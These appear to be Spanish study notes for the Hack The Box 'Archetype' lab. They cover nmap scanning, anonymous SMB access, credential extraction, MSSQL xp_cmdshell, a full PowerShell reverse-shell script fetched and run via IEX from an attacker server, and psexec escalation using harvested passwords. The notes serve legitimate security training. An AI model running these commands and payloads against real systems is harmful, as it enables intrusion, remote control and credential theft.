Hackthebox>

starting point 


Primer paso

 ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

ports ? 

-p- los primeros 64000 

--min-rate=1000 para que envie 1000 paquetes por segundos

-T Plantilla de tiempo 

| pipe combinar comandos

//////////INICIO>

grep busca una expresion regular de la linea de comando , lee la entrada standaro lista de archivos 
e imprime las lineas que contenga coincidencia para la expresion regular. 

^[0-9] excepcionar caracter 0-9

<FIN/////////////////

///////////////INICIO> 

cut cortar columnas de uno o mas ficheros
-d delimitar por /
-F selecciona el campo 1 que no este contenido en un caracter delimitador 
1 encendido? 


//////////////

tr traducir o reemplazar a otro argumento



//////////////////////

SED stream editor , insertar , borrar , buscar , reemplazar 
-s delimitador 

/////////////////////////

nmap -sC default script
nmap -sV verificar servicios 

///////////////////////////////////////

Resultado del escaneo de 

ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports 10.10.10.27 

135 msrpc
139 netbios-ssn
445 microsfot-ds
1433 ms-sql-s/

target: ARCHETYPE
service smb 443, SQL 1433

Verificar si se se ha permitido el acceso anonimo , ya que los archivos de conf contraseñas u otra informacion
adicional 

///////////////////////////////////

smbclient -N -L \\\\10.10.10.27\\

smbclient herramienta para acceder a recursos compartidos en servidores microsoft y SAMBA

-N no pass , suprime el uso de contraseña. 

-L listar registros de directorios, mostrar recursos compartidos

\ indica el directorio de trabjo 
\\\\<IP>\\ porque tantos? \

Resultado de smbclient -N -L \\\\10.10.10.27\\

bakcups

ver que contiene el archivo backups 

////////////////////////////////////////////

smbclient -N \\\\10.10.10.27\\backups

Resultado de smbclient -N \\\\10.10.10.27\\backups

Try help to get a list of possible commands 

smb: \>

/////////////////////////////////////////////////

smb: \>dir  listar directorios

resultado de smb: \>dir  listar directorios

prod.dtsConfig

hay un archivo de configuracion que se usa con SSIS(SQL Server Integration Services) 

///////////////////////////////////////////////////

smb: \> get prod.dtsConfig 

Obtener el archivo


////////////////////////////////////////////////////

smb: \>exit

salir dela conexion smb

////////////////////////////////////////////////


cat prod.dtsConfig

contiene una cadena de conexion SQL con las credenciales para el usuario ARCHETYPE\sql-s

Resultado de cat prod.dtsConfig

Password=M3g4c0rp123 user ARCHETYPE\sql_svc

/////////////////////////////////////////////////

mssqlclient.py usar el cliente para SQL

python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE\sql_svc@10.10.10.27 -windows-auth

autenticarme con las credenciales encontradas en prod.dtsConfig

M3g4c0rp123

////////////////////////////////

Verificamos si el usuario tiene privilegio de administrador 

Verificar si tenemos privilegios de administrador en SQL


SELECT IS_SRVROLEMEMBER

 EXEC sp_configure 'Show Advanced Options', 1;
 reconfigure;
 sp_configure;
 EXEC sp_configure 'xp_cmdshell', 1
 reconfigure;
 xp_cmdshell "whoami"


La salida del comando whoami revela que SQL Server también se está ejecutando en el contexto del 
usuario ARCHETYPE \ sql_svc. Sin embargo, esta cuenta no parece tener privilegios administrativos en el host.

Intentemos obtener un shell adecuado y procedamos a enumerar más el sistema. 
Podemos guardar el shell inverso de PowerShell a continuación como shell.ps1.

/////////////////////////////////////////////////////////////////////////

Creamos un script en powershell para conexion de reversa TCP

$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 

IP > maquina atacante

/////////////////////////////////////////////////////////////////////////////

Levantar server web en maquina atacante

sudo python3 -m http.server 80 


/////////////////////////////////////////////////////////////////

Poner en escucha el puerto 443 

sudo nc -lvpn 443 


////////////////////////////////////////////////////////////////

Permitir en el firewall de linux (Maquina atacante) los puerto 80 y 443 

sudo ufw allow from 10.10.10.27 proto tcp to any port 80,443


///////////////////////////////////////////////////////////////

Descargar y ejecutar el script de powershell en la maquina victima

xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.6/shell.ps1\");"


/////////////////////////////////////////////////////////////////////
 
En el netcat se establece la session

# dir


/////////////////////////////////////////////////////////////////////

Ver que tiene el archivo ConsoleHost_history.txt

Porque esa ruta? 

type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 


Resultado

User: administrator Pass: MEGACORP_4dm1n!!

/////////////////////////////////////////////////////////////////////////


sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.27
Passw: MEGACORP_4dm1n!!

cd c:\Users\Administrator\Desktop
 
type root.txt
